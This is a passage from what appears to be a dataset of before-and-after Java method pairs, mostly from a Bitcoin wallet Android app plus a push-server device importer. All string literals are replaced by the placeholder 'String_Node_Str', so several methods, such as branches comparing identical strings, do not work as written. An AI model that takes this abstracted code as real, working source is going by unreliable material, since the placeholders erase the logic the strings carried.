    status+=getString(R.string.sss_incompatible_shares_warning);
    shares.remove(last);
  }
catch (  BipSss.NotEnoughSharesException e) {
    status+=""String_Node_Str"";
    if (e.needed == 1) {
      status+=getString(R.string.sss_one_more_share_needed);
    }
 else {
      status+=getString(R.string.sss_more_shares_needed,e.needed);
    }
  }
catch (  BipSss.InvalidContentTypeException e) {
    status+=""String_Node_Str"";
    status+=getString(R.string.sss_unrecognized_share_warning);
  }
  ((TextView)findViewById(R.id.tvStatus)).setText(status);
}"
91216,"private void populateTraderInfo(PublicTraderInfo pti){
  TraderInfo ti=null;
  _adapter.clear();
  if (pti == null) {
    return;
  }
  if (pti instanceof TraderInfo) {
    ti=(TraderInfo)pti;
  }
  _adapter.add(new InfoItem(getString(R.string.lt_trader_name_label),pti.nickname));
  _adapter.add(new InfoItem(getString(R.string.lt_trader_address_label),pti.address.getShortAddress()));
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_trader_email_address_label),ti.notificationEmail));
  }
  _adapter.add(new InfoItem(getString(R.string.lt_trader_last_activity),LtAndroidUtils.getTimeSpanString(this.getActivity(),pti.idleTime)));
  _adapter.add(new InfoItem(getString(R.string.lt_trader_age_label),getResources().getString(R.string.lt_time_in_days,pti.traderAgeMs / Constants.MS_PR_DAY)));
  _adapter.add(new InfoItem(getString(R.string.lt_successful_sells_label),Integer.toString(pti.successfulSales)));
  _adapter.add(new InfoItem(getString(R.string.lt_aborted_sells_label),Integer.toString(pti.abortedSales)));
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_total_sold_label),_mbwManager.getBtcValueString(ti.totalBtcSold)));
  }
  _adapter.add(new InfoItem(getString(R.string.lt_successful_buys_label),Integer.toString(pti.successfulBuys)));
  _adapter.add(new InfoItem(getString(R.string.lt_aborted_buys_label),Integer.toString(pti.abortedBuys)));
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_total_bought_label),_mbwManager.getBtcValueString(ti.totalBtcBought)));
  }
  if (pti.tradeMedianMs != null) {
    String hourString=LtAndroidUtils.getApproximateTimeInHours(getActivity(),pti.tradeMedianMs);
    _adapter.add(new InfoItem(getString(R.string.lt_expected_trade_time_label),hourString));
  }
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_local_trader_commission_label),roundDoubleHalfUp(ti.localTraderPremium,2).toString() + ""String_Node_Str""));
  }
}","private void populateTraderInfo(PublicTraderInfo pti){
  TraderInfo ti=null;
  _adapter.clear();
  if (pti == null) {
    return;
  }
  if (pti instanceof TraderInfo) {
    ti=(TraderInfo)pti;
  }
  _adapter.add(new InfoItem(getString(R.string.lt_trader_name_label),pti.nickname));
  _adapter.add(new InfoItem(getString(R.string.lt_trader_address_label),pti.address.getShortAddress()));
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_trader_email_address_label),ti.notificationEmail));
  }
  _adapter.add(new InfoItem(getString(R.string.lt_trader_last_activity),LtAndroidUtils.getTimeSpanString(this.getActivity(),pti.idleTime)));
  _adapter.add(new InfoItem(getString(R.string.lt_trader_age_label),getResources().getString(R.string.lt_time_in_days,Long.toString(pti.traderAgeMs / Constants.MS_PR_DAY))));
  _adapter.add(new InfoItem(getString(R.string.lt_successful_sells_label),Integer.toString(pti.successfulSales)));
  _adapter.add(new InfoItem(getString(R.string.lt_aborted_sells_label),Integer.toString(pti.abortedSales)));
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_total_sold_label),_mbwManager.getBtcValueString(ti.totalBtcSold)));
  }
  _adapter.add(new InfoItem(getString(R.string.lt_successful_buys_label),Integer.toString(pti.successfulBuys)));
  _adapter.add(new InfoItem(getString(R.string.lt_aborted_buys_label),Integer.toString(pti.abortedBuys)));
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_total_bought_label),_mbwManager.getBtcValueString(ti.totalBtcBought)));
  }
  if (pti.tradeMedianMs != null) {
    String hourString=LtAndroidUtils.getApproximateTimeInHours(getActivity(),pti.tradeMedianMs);
    _adapter.add(new InfoItem(getString(R.string.lt_expected_trade_time_label),hourString));
  }
  if (ti != null) {
    _adapter.add(new InfoItem(getString(R.string.lt_local_trader_commission_label),roundDoubleHalfUp(ti.localTraderPremium,2).toString() + ""String_Node_Str""));
  }
}"
91217,"@Override protected void onResume(){
  super.onResume();
  String uriString=getIntent().getStringExtra(""String_Node_Str"");
  Uri uri=Uri.parse(uriString);
  final boolean success=uri.getQueryParameter(""String_Node_Str"").equals(""String_Node_Str"");
  glideraService=GlideraService.getInstance();
  glideraService.status().observeOn(AndroidSchedulers.mainThread()).subscribe(new Observer<StatusResponse>(){
    @Override public void onCompleted(){
    }
    @Override public void onError(    Throwable e){
      handleError();
    }
    @Override public void onNext(    StatusResponse statusResponse){
      if (statusResponse.isUserCanTransact()) {
        Intent intent=new Intent(GlideraSendToNextStep.this,GlideraMainActivity.class);
        startActivity(intent);
        finish();
      }
 else {
        if (success) {
          String uri=glideraService.getSetupUrl();
          Utils.openWebsite(GlideraSendToNextStep.this,uri);
        }
 else {
          handleError();
        }
      }
    }
  }
);
}","@Override protected void onResume(){
  super.onResume();
  String uriString=getIntent().getStringExtra(""String_Node_Str"");
  Uri uri=Uri.parse(uriString);
  final String status=uri.getQueryParameter(""String_Node_Str"");
  glideraService=GlideraService.getInstance();
  glideraService.status().observeOn(AndroidSchedulers.mainThread()).subscribe(new Observer<StatusResponse>(){
    @Override public void onCompleted(){
    }
    @Override public void onError(    Throwable e){
      handleError();
    }
    @Override public void onNext(    StatusResponse statusResponse){
      if (statusResponse.isUserCanTransact()) {
        Intent intent=new Intent(GlideraSendToNextStep.this,GlideraMainActivity.class);
        startActivity(intent);
        finish();
      }
 else {
        if (status != null && status.equals(""String_Node_Str"")) {
          String uri=glideraService.getSetupUrl();
          Utils.openWebsite(GlideraSendToNextStep.this,uri);
        }
 else         if (status != null && status.equals(""String_Node_Str"")) {
          Intent intent=new Intent(GlideraSendToNextStep.this,BuySellSelect.class);
          startActivity(intent);
          finish();
        }
 else {
          handleError();
        }
      }
    }
  }
);
}"
91218,"@Override public void onNext(StatusResponse statusResponse){
  if (statusResponse.isUserCanTransact()) {
    Intent intent=new Intent(GlideraSendToNextStep.this,GlideraMainActivity.class);
    startActivity(intent);
    finish();
  }
 else {
    if (success) {
      String uri=glideraService.getSetupUrl();
      Utils.openWebsite(GlideraSendToNextStep.this,uri);
    }
 else {
      handleError();
    }
  }
}","@Override public void onNext(StatusResponse statusResponse){
  if (statusResponse.isUserCanTransact()) {
    Intent intent=new Intent(GlideraSendToNextStep.this,GlideraMainActivity.class);
    startActivity(intent);
    finish();
  }
 else {
    if (status != null && status.equals(""String_Node_Str"")) {
      String uri=glideraService.getSetupUrl();
      Utils.openWebsite(GlideraSendToNextStep.this,uri);
    }
 else     if (status != null && status.equals(""String_Node_Str"")) {
      Intent intent=new Intent(GlideraSendToNextStep.this,BuySellSelect.class);
      startActivity(intent);
      finish();
    }
 else {
      handleError();
    }
  }
}"
91219,"@Override public void onResume(){
  super.onResume();
  addTextChangedListeners();
}","@Override public void onResume(){
  super.onResume();
  String value=etBuyBtc.getText().toString();
  if (!value.isEmpty()) {
    BigDecimal btc;
    try {
      btc=new BigDecimal(value);
      queryPricing(btc,null);
    }
 catch (    NumberFormatException numberFormatException) {
    }
  }
  addTextChangedListeners();
}"
91220,"@Override public View onCreateView(LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  View root=Preconditions.checkNotNull(inflater.inflate(R.layout.glidera_buy,container,false));
  etBuyFiat=(EditText)root.findViewById(R.id.etBuyFiat);
  etBuyBtc=(EditText)root.findViewById(R.id.etBuyBtc);
  tvSubtotal=(TextView)root.findViewById(R.id.tvFiatAmount);
  tvBtcAmount=(TextView)root.findViewById(R.id.tvBtcAmount);
  tvFeeAmount=(TextView)root.findViewById(R.id.tvFeeAmount);
  tvTotalAmount=(TextView)root.findViewById(R.id.tvTotalAmount);
  tvPrice=(TextView)root.findViewById(R.id.tvPrice);
  Button buttonBuyBitcoin=(Button)root.findViewById(R.id.buttonBuyBitcoin);
  final TextView tvBuyFiatDescription=(TextView)root.findViewById(R.id.tvBuyFiatDescription);
  final BuyPriceRequest buyPriceRequest=new BuyPriceRequest(BigDecimal.ONE,null);
  glideraService.buyPrice(buyPriceRequest).subscribe(new Observer<BuyPriceResponse>(){
    @Override public void onCompleted(){
    }
    @Override public void onError(    Throwable e){
    }
    @Override public void onNext(    BuyPriceResponse buyPriceResponse){
      tvBuyFiatDescription.setText(buyPriceResponse.getCurrency());
      tvPrice.setText(GlideraUtils.formatFiatForDisplay(buyPriceResponse.getPrice()));
      currencyIso=buyPriceResponse.getCurrency();
    }
  }
);
  glideraService.transactionLimits().subscribe(new Observer<TransactionLimitsResponse>(){
    @Override public void onCompleted(){
    }
    @Override public void onError(    Throwable e){
    }
    @Override public void onNext(    TransactionLimitsResponse transactionLimitsResponse){
      _transactionLimitsResponse=transactionLimitsResponse;
    }
  }
);
  buttonBuyBitcoin.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      String qty=etBuyBtc.getText().toString();
      if (qty.isEmpty()) {
        String error=""String_Node_Str"" + GlideraUtils.formatBtcForDisplay(BigDecimal.ZERO);
        setError(BuyMode.BTC,error);
        return;
      }
      BigDecimal fiat=new BigDecimal(etBuyFiat.getText().toString());
      if (fiat.compareTo(_transactionLimitsResponse.getDailyBuyRemaining()) > 0) {
        String error=""String_Node_Str"" + GlideraUtils.formatFiatForDisplay(_transactionLimitsResponse.getDailyBuyRemaining());
        setError(BuyMode.FIAT,error);
        return;
      }
      glideraService.getTwoFactor().subscribe(new Observer<TwoFactorResponse>(){
        @Override public void onCompleted(){
        }
        @Override public void onError(        Throwable e){
        }
        @Override public void onNext(        TwoFactorResponse twoFactorResponse){
          DialogFragment newFragment=GlideraBuy2faDialog.newInstance(_buyMode,_btc,_fiat,twoFactorResponse.getMode());
          newFragment.show(getFragmentManager(),""String_Node_Str"");
        }
      }
);
    }
  }
);
  return root;
}","@Override public View onCreateView(LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  View root=Preconditions.checkNotNull(inflater.inflate(R.layout.glidera_buy,container,false));
  etBuyFiat=(EditText)root.findViewById(R.id.etBuyFiat);
  etBuyBtc=(EditText)root.findViewById(R.id.etBuyBtc);
  tvSubtotal=(TextView)root.findViewById(R.id.tvFiatAmount);
  tvBtcAmount=(TextView)root.findViewById(R.id.tvBtcAmount);
  tvFeeAmount=(TextView)root.findViewById(R.id.tvFeeAmount);
  tvTotalAmount=(TextView)root.findViewById(R.id.tvTotalAmount);
  tvPrice=(TextView)root.findViewById(R.id.tvPrice);
  tvBuyFiatDescription=(TextView)root.findViewById(R.id.tvBuyFiatDescription);
  Button buttonBuyBitcoin=(Button)root.findViewById(R.id.buttonBuyBitcoin);
  final BuyPriceRequest buyPriceRequest=new BuyPriceRequest(BigDecimal.ONE,null);
  glideraService.buyPrice(buyPriceRequest).subscribe(new Observer<BuyPriceResponse>(){
    @Override public void onCompleted(){
    }
    @Override public void onError(    Throwable e){
    }
    @Override public void onNext(    BuyPriceResponse buyPriceResponse){
      tvBuyFiatDescription.setText(buyPriceResponse.getCurrency());
      tvPrice.setText(GlideraUtils.formatFiatForDisplay(buyPriceResponse.getPrice()));
      currencyIso=buyPriceResponse.getCurrency();
    }
  }
);
  glideraService.transactionLimits().subscribe(new Observer<TransactionLimitsResponse>(){
    @Override public void onCompleted(){
    }
    @Override public void onError(    Throwable e){
    }
    @Override public void onNext(    TransactionLimitsResponse transactionLimitsResponse){
      _transactionLimitsResponse=transactionLimitsResponse;
    }
  }
);
  buttonBuyBitcoin.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      String qty=etBuyBtc.getText().toString();
      if (qty.isEmpty()) {
        String error=""String_Node_Str"" + GlideraUtils.formatBtcForDisplay(BigDecimal.ZERO);
        setError(BuyMode.BTC,error);
        return;
      }
      BigDecimal fiat=new BigDecimal(etBuyFiat.getText().toString());
      if (fiat.compareTo(_transactionLimitsResponse.getDailyBuyRemaining()) > 0) {
        String error=""String_Node_Str"" + GlideraUtils.formatFiatForDisplay(_transactionLimitsResponse.getDailyBuyRemaining());
        setError(BuyMode.FIAT,error);
        return;
      }
      glideraService.getTwoFactor().subscribe(new Observer<TwoFactorResponse>(){
        @Override public void onCompleted(){
        }
        @Override public void onError(        Throwable e){
        }
        @Override public void onNext(        TwoFactorResponse twoFactorResponse){
          DialogFragment newFragment=GlideraBuy2faDialog.newInstance(_buyMode,_btc,_fiat,twoFactorResponse.getMode());
          newFragment.show(getFragmentManager(),""String_Node_Str"");
        }
      }
);
    }
  }
);
  return root;
}"
91221,"@Override public void onResume(){
  super.onResume();
  addTextChangedListeners();
}","@Override public void onResume(){
  super.onResume();
  String value=etSellBtc.getText().toString();
  if (!value.isEmpty()) {
    BigDecimal btc;
    try {
      btc=new BigDecimal(value);
      queryPricing(btc,null);
    }
 catch (    NumberFormatException numberFormatException) {
    }
  }
  addTextChangedListeners();
}"
91222,"private GlideraService(@NonNull final NetworkParameters networkParameters){
  Preconditions.checkNotNull(networkParameters);
  this.networkParameters=networkParameters;
  this.baseUrl=getBaseUrl(networkParameters);
  if (networkParameters.isTestnet()) {
    clientId=TESTNET_CLIENT_ID;
  }
 else {
    clientId=MAINNET_CLIENT_ID;
  }
  final Interceptor apiCredentialInterceptor=new Interceptor(){
    @Override public Response intercept(    Chain chain) throws IOException {
      Request request=chain.request();
      if (_oAuth1Response != null) {
        Request.Builder requestBuilder=request.newBuilder();
synchronized (nonceSync) {
          final String nonce=String.valueOf(getNonce());
          final String uri=request.urlString();
          String message=nonce + uri;
          if (request.body() != null && request.body().contentLength() > 0) {
            Buffer bodyBuffer=new Buffer();
            request.body().writeTo(bodyBuffer);
            byte[] bodyBytes=bodyBuffer.readByteArray();
            String body=new String(bodyBytes,Charsets.UTF_8);
            message+=body;
          }
          final byte[] messageBytes=message.getBytes(Charsets.UTF_8);
          final byte[] secretBytes=_oAuth1Response.getSecret().getBytes(Charsets.UTF_8);
          final byte[] signatureBytes=Hmac.hmacSha256(secretBytes,messageBytes);
          ByteArrayOutputStream stream=new ByteArrayOutputStream();
          Hex.encode(signatureBytes,stream);
          final String signature=stream.toString();
          request=requestBuilder.header(HEADER_ACCESS_KEY,_oAuth1Response.getAccess_key()).header(HEADER_ACCESS_NONCE,nonce).header(HEADER_ACCESS_SIGNATURE,signature).build();
        }
      }
      return chain.proceed(request);
    }
  }
;
  OkHttpClient client=new OkHttpClient();
  client.setConnectTimeout(15000,TimeUnit.MILLISECONDS);
  client.setReadTimeout(15000,TimeUnit.MILLISECONDS);
  client.networkInterceptors().add(apiCredentialInterceptor);
  ObjectMapper objectMapper=new ObjectMapper();
  objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,false);
  objectMapper.registerModule(new WapiJsonModule());
  RequestInterceptor requestInterceptor=new RequestInterceptor(){
    @Override public void intercept(    RequestFacade requestFacade){
      requestFacade.addHeader(HEADER_CLIENT_ID,clientId);
    }
  }
;
  RestAdapter adapter=new RestAdapter.Builder().setEndpoint(baseUrl + ""String_Node_Str"" + API_VERSION+ ""String_Node_Str"").setLogLevel(RestAdapter.LogLevel.BASIC).setConverter(new JacksonConverter(objectMapper)).setClient(new OkClient(client)).setRequestInterceptor(requestInterceptor).build();
  glideraApi=adapter.create(GlideraApi.class);
}","private GlideraService(@NonNull final NetworkParameters networkParameters){
  Preconditions.checkNotNull(networkParameters);
  this.networkParameters=networkParameters;
  this.baseUrl=getBaseUrl(networkParameters);
  if (networkParameters.isTestnet()) {
    clientId=TESTNET_CLIENT_ID;
  }
 else {
    clientId=MAINNET_CLIENT_ID;
  }
  final Interceptor apiCredentialInterceptor=new Interceptor(){
    @Override public Response intercept(    Chain chain) throws IOException {
      Request request=chain.request();
      if (_oAuth1Response != null) {
        Request.Builder requestBuilder=request.newBuilder();
synchronized (nonceSync) {
          final String nonce=String.valueOf(getNonce());
          final String uri=request.urlString();
          String message=nonce + uri;
          if (request.body() != null && request.body().contentLength() > 0) {
            Buffer bodyBuffer=new Buffer();
            request.body().writeTo(bodyBuffer);
            byte[] bodyBytes=bodyBuffer.readByteArray();
            String body=new String(bodyBytes,Charsets.UTF_8);
            message+=body;
          }
          final byte[] messageBytes=message.getBytes(Charsets.UTF_8);
          final byte[] secretBytes=_oAuth1Response.getSecret().getBytes(Charsets.UTF_8);
          final byte[] signatureBytes=Hmac.hmacSha256(secretBytes,messageBytes);
          ByteArrayOutputStream stream=new ByteArrayOutputStream();
          Hex.encode(signatureBytes,stream);
          final String signature=stream.toString();
          request=requestBuilder.header(HEADER_ACCESS_KEY,_oAuth1Response.getAccess_key()).header(HEADER_ACCESS_NONCE,nonce).header(HEADER_ACCESS_SIGNATURE,signature).build();
        }
      }
      return chain.proceed(request);
    }
  }
;
  OkHttpClient client=new OkHttpClient();
  client.setConnectTimeout(15000,TimeUnit.MILLISECONDS);
  client.setReadTimeout(15000,TimeUnit.MILLISECONDS);
  client.networkInterceptors().add(apiCredentialInterceptor);
  ObjectMapper objectMapper=new ObjectMapper();
  objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,false);
  objectMapper.registerModule(new WapiJsonModule());
  RequestInterceptor requestInterceptor=new RequestInterceptor(){
    @Override public void intercept(    RequestFacade requestFacade){
      requestFacade.addHeader(HEADER_CLIENT_ID,clientId);
    }
  }
;
  RestAdapter adapter=new RestAdapter.Builder().setEndpoint(baseUrl + ""String_Node_Str"" + API_VERSION+ ""String_Node_Str"").setLogLevel(RestAdapter.LogLevel.BASIC).setConverter(new JacksonConverter(objectMapper)).setClient(new NullBodyAwareOkClient(client)).setRequestInterceptor(requestInterceptor).build();
  glideraApi=adapter.create(GlideraApi.class);
}"
91223,"/** 
 * Show a dialog with a buttons that displays a message. Click the message or the back button to make it disappear.
 */
public static void showSimpleMessageDialog(final Context context,String message,final Runnable okayRunner,@StringRes int okayButtonText,final Runnable postRunner){
  LayoutInflater inflater=(LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  final View layout=inflater.inflate(R.layout.simple_message_dialog,null);
  AlertDialog.Builder builder=new AlertDialog.Builder(context).setView(layout);
  final AlertDialog dialog=builder.create();
  TextView tvMessage=((TextView)layout.findViewById(R.id.tvMessage));
  tvMessage.setText(message);
  TextView okButton=(TextView)layout.findViewById(R.id.btOk);
  okButton.setText(okayButtonText);
  okButton.setOnClickListener(new OnClickListener(){
    @Override public void onClick(    View v){
      dialog.dismiss();
      if (okayRunner != null) {
        okayRunner.run();
      }
    }
  }
);
  dialog.setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialog){
      if (postRunner != null) {
        postRunner.run();
      }
    }
  }
);
  dialog.show();
}","/** 
 * Show a dialog with a buttons that displays a message. Click the message or the back button to make it disappear.
 */
public static void showSimpleMessageDialog(final Context context,String message,final Runnable okayRunner,int okayButtonText,final Runnable postRunner){
  LayoutInflater inflater=(LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  final View layout=inflater.inflate(R.layout.simple_message_dialog,null);
  AlertDialog.Builder builder=new AlertDialog.Builder(context).setView(layout);
  final AlertDialog dialog=builder.create();
  TextView tvMessage=((TextView)layout.findViewById(R.id.tvMessage));
  tvMessage.setText(message);
  TextView okButton=(TextView)layout.findViewById(R.id.btOk);
  okButton.setText(okayButtonText);
  okButton.setOnClickListener(new OnClickListener(){
    @Override public void onClick(    View v){
      dialog.dismiss();
      if (okayRunner != null) {
        okayRunner.run();
      }
    }
  }
);
  dialog.setOnDismissListener(new DialogInterface.OnDismissListener(){
    @Override public void onDismiss(    DialogInterface dialog){
      if (postRunner != null) {
        postRunner.run();
      }
    }
  }
);
  dialog.show();
}"
91224,"private UnsignedTransaction(List<TransactionOutput> outputs,List<UnspentTransactionOutput> funding,IPublicKeyRing keyRing,boolean isPop,NetworkParameters network){
  _network=network;
  _outputs=outputs.toArray(new TransactionOutput[]{});
  _funding=funding.toArray(new UnspentTransactionOutput[]{});
  _signingRequests=new SigningRequest[_funding.length];
  _isPop=isPop;
  TransactionInput[] inputs=new TransactionInput[_funding.length];
  for (int i=0; i < _funding.length; i++) {
    inputs[i]=new TransactionInput(_funding[i].outPoint,ScriptInput.EMPTY);
    if (isPop) {
      inputs[i].sequence=0;
    }
  }
  Transaction transaction=new Transaction(1,inputs,_outputs,isPop ? MAX_LOCK_TIME : 0);
  for (int i=0; i < _funding.length; i++) {
    UnspentTransactionOutput f=_funding[i];
    if (!(f.script instanceof ScriptOutputStandard)) {
      throw new RuntimeException(""String_Node_Str"");
    }
    byte[] addressBytes=((ScriptOutputStandard)f.script).getAddressBytes();
    Address address=Address.fromStandardBytes(addressBytes,_network);
    PublicKey publicKey=keyRing.findPublicKeyByAddress(address);
    if (publicKey == null) {
      throw new RuntimeException(""String_Node_Str"");
    }
    inputs[i].script=ScriptInput.fromOutputScript(_funding[i].script);
    Sha256Hash hash=hashTransaction(transaction);
    inputs[i]=new TransactionInput(_funding[i].outPoint,ScriptInput.EMPTY);
    _signingRequests[i]=new SigningRequest(publicKey,hash);
  }
}","protected UnsignedTransaction(List<TransactionOutput> outputs,List<UnspentTransactionOutput> funding,IPublicKeyRing keyRing,NetworkParameters network){
  _network=network;
  _outputs=outputs.toArray(new TransactionOutput[]{});
  _funding=funding.toArray(new UnspentTransactionOutput[]{});
  _signingRequests=new SigningRequest[_funding.length];
  TransactionInput[] inputs=new TransactionInput[_funding.length];
  for (int i=0; i < _funding.length; i++) {
    inputs[i]=new TransactionInput(_funding[i].outPoint,ScriptInput.EMPTY,getDefaultSequenceNumber());
  }
  Transaction transaction=new Transaction(1,inputs,_outputs,getLockTime());
  for (int i=0; i < _funding.length; i++) {
    UnspentTransactionOutput f=_funding[i];
    if (!(f.script instanceof ScriptOutputStandard)) {
      throw new RuntimeException(""String_Node_Str"");
    }
    byte[] addressBytes=((ScriptOutputStandard)f.script).getAddressBytes();
    Address address=Address.fromStandardBytes(addressBytes,_network);
    PublicKey publicKey=keyRing.findPublicKeyByAddress(address);
    if (publicKey == null) {
      throw new RuntimeException(""String_Node_Str"");
    }
    inputs[i].script=ScriptInput.fromOutputScript(_funding[i].script);
    Sha256Hash hash=hashTransaction(transaction);
    inputs[i]=new TransactionInput(_funding[i].outPoint,ScriptInput.EMPTY);
    _signingRequests[i]=new SigningRequest(publicKey,hash);
  }
}"
91225,"public static Transaction finalizeTransaction(UnsignedTransaction unsigned,List<byte[]> signatures){
  TransactionInput[] inputs=new TransactionInput[unsigned._funding.length];
  for (int i=0; i < unsigned._funding.length; i++) {
    ScriptInputStandard script=new ScriptInputStandard(signatures.get(i),unsigned._signingRequests[i].publicKey.getPublicKeyBytes());
    inputs[i]=new TransactionInput(unsigned._funding[i].outPoint,script);
    if (unsigned._isPop) {
      inputs[i].sequence=0;
    }
  }
  Transaction transaction=new Transaction(1,inputs,unsigned._outputs,unsigned._isPop ? MAX_LOCK_TIME : 0);
  return transaction;
}","public static Transaction finalizeTransaction(UnsignedTransaction unsigned,List<byte[]> signatures){
  TransactionInput[] inputs=new TransactionInput[unsigned._funding.length];
  for (int i=0; i < unsigned._funding.length; i++) {
    ScriptInputStandard script=new ScriptInputStandard(signatures.get(i),unsigned._signingRequests[i].publicKey.getPublicKeyBytes());
    inputs[i]=new TransactionInput(unsigned._funding[i].outPoint,script,unsigned.getDefaultSequenceNumber());
  }
  Transaction transaction=new Transaction(1,inputs,unsigned._outputs,unsigned.getLockTime());
  return transaction;
}"
91226,"@Override public boolean handle(StringHandlerActivity handlerActivity,String content){
  if (!isBtcpopURI(content)) {
    return false;
  }
  PopRequest popRequest;
  try {
    popRequest=new PopRequest(content);
  }
 catch (  IllegalArgumentException e) {
    handlerActivity.finishError(R.string.invalid_pop_uri,content);
    return false;
  }
  Intent intent=new Intent(handlerActivity,PopActivity.class);
  intent.putExtra(""String_Node_Str"",popRequest);
  intent.addFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);
  handlerActivity.startActivity(intent);
  handlerActivity.finishOk();
  return true;
}","@Override public boolean handle(StringHandlerActivity handlerActivity,String content){
  if (!isBtcpopURI(content)) {
    return false;
  }
  PopRequest popRequest;
  try {
    popRequest=new PopRequest(content);
  }
 catch (  IllegalArgumentException e) {
    handlerActivity.finishError(R.string.pop_invalid_pop_uri,content);
    return false;
  }
  Intent intent=new Intent(handlerActivity,PopActivity.class);
  intent.putExtra(""String_Node_Str"",popRequest);
  intent.addFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);
  handlerActivity.startActivity(intent);
  handlerActivity.finishOk();
  return true;
}"
91227,"private void clicked(int digit){
  if (digit == DEL) {
    if (_entry.length() == 0) {
      return;
    }
    _entry=_entry.substring(0,_entry.length() - 1);
  }
 else   if (digit == DOT) {
    if (hasDot()) {
      return;
    }
    if (_maxDecimals == 0) {
      return;
    }
    if (_entry.length() == 0) {
      _entry=""String_Node_Str"";
    }
 else {
      _entry=_entry + '.';
    }
  }
 else {
    if (digit == 0 && _entry.startsWith(""String_Node_Str"") && !hasDot()) {
      return;
    }
    if (hasDot()) {
      if (decimalsAfterDot() >= _maxDecimals) {
        return;
      }
    }
 else {
      if (decimalsBeforeDot() >= MAX_DIGITS_BEFORE_DOT) {
        return;
      }
    }
    _entry=_entry + (digit);
  }
  _listener.onEntryChanged(_entry);
  if (hasDot()) {
  }
}","private void clicked(int digit){
  if (digit == DEL) {
    if (_entry.length() == 0) {
      return;
    }
    _entry=_entry.substring(0,_entry.length() - 1);
  }
 else   if (digit == DOT) {
    if (hasDot()) {
      return;
    }
    if (_maxDecimals == 0) {
      return;
    }
    if (_entry.length() == 0) {
      _entry=""String_Node_Str"";
    }
 else {
      _entry=_entry + '.';
    }
  }
 else {
    if (digit == 0 && _entry.equals(""String_Node_Str"")) {
      return;
    }
    if (hasDot()) {
      if (decimalsAfterDot() >= _maxDecimals) {
        return;
      }
    }
 else {
      if (decimalsBeforeDot() >= MAX_DIGITS_BEFORE_DOT) {
        return;
      }
    }
    _entry=_entry + (digit);
  }
  _listener.onEntryChanged(_entry);
  if (hasDot()) {
  }
}"
91228,"public FortunaRandomSource(){
  fortuna=Fortuna.createInstance(Iterables.concat(jmxSources(),defaultSources(),linuxSource()));
}","public FortunaRandomSource(){
  fortuna=Fortuna.createInstance(Iterables.concat(jmxSources(),defaultSources(),platformSource()));
}"
91229,"private static Iterable<EntropySource> defaultSources(){
  ImmutableList.Builder<EntropySource> b=ImmutableList.builder();
  b.add(new SchedulingEntropySource(),new GarbageCollectorEntropySource(),new LoadAverageEntropySource(),new FreeMemoryEntropySource(),new ThreadTimeEntropySource(),new UptimeEntropySource());
  if (new File(""String_Node_Str"").exists()) {
    b.add(new URandomEntropySource());
  }
  return b.build();
}","private static Iterable<EntropySource> defaultSources(){
  ImmutableList.Builder<EntropySource> b=ImmutableList.builder();
  b.add(new SchedulingEntropySource(),new GarbageCollectorEntropySource(),new LoadAverageEntropySource(),new FreeMemoryEntropySource(),new ThreadTimeEntropySource(),new UptimeEntropySource());
  if (new File(""String_Node_Str"").exists()) {
    b.add(new PlatformEntropySource());
  }
  return b.build();
}"
91230,"/** 
 * API for uploading JSON file to allow massive device registration (aka import). The Endpoint is protected using <code>HTTP Basic</code> (credentials <code>VariantID:secret</code>). <pre> curl -u ""variantID:secret"" -v -H ""Accept: application/json"" -H ""Content-type: multipart/form-data"" -F ""file=@/path/to/my-devices-for-import.json"" -X POST https://SERVER:PORT/context/rest/registry/device/importer </pre> The format of the JSON file is an array, containing several objects that follow the same syntax used on the <code>/rest/registry/device</code> endpoint. <p/> Here is an example: <pre> [ { ""deviceToken"" : ""someTokenString"", ""deviceType"" : ""iPad"", ""operatingSystem"" : ""iOS"", ""osVersion"" : ""6.1.2"", ""alias"" : ""someUsername or email adress..."", ""categories"" : [""football"", ""sport""] }, { ""deviceToken"" : ""someOtherTokenString"", ... }, ... ] </pre>
 * @param form  JSON file to import
 * @return      empty JSON body
 * @responseheader WWW-Authenticate Basic realm=""AeroGear UnifiedPush Server"" (only for 401 response)
 * @statuscode 200 Successful submission of import job
 * @statuscode 400 The format of the client request was incorrect
 * @statuscode 401 The request requires authentication
 */
@POST @Path(""String_Node_Str"") @Consumes(MediaType.MULTIPART_FORM_DATA) @Produces(MediaType.APPLICATION_JSON) @BodyType(""String_Node_Str"") @ReturnType(""String_Node_Str"") public Response importDevice(@MultipartForm ImporterForm form,@Context HttpServletRequest request){
  final Variant variant=loadVariantWhenAuthorized(request);
  if (variant == null) {
    return create401Response(request);
  }
  List<Installation> devices;
  try {
    devices=mapper.readValue(form.getJsonFile(),new TypeReference<List<Installation>>(){
    }
);
  }
 catch (  IOException e) {
    logger.severe(""String_Node_Str"",e);
    return Response.status(Status.BAD_REQUEST).build();
  }
  logger.info(""String_Node_Str"" + devices.size());
  clientInstallationService.addInstallations(variant,devices);
  return Response.ok(EmptyJSON.STRING).build();
}","/** 
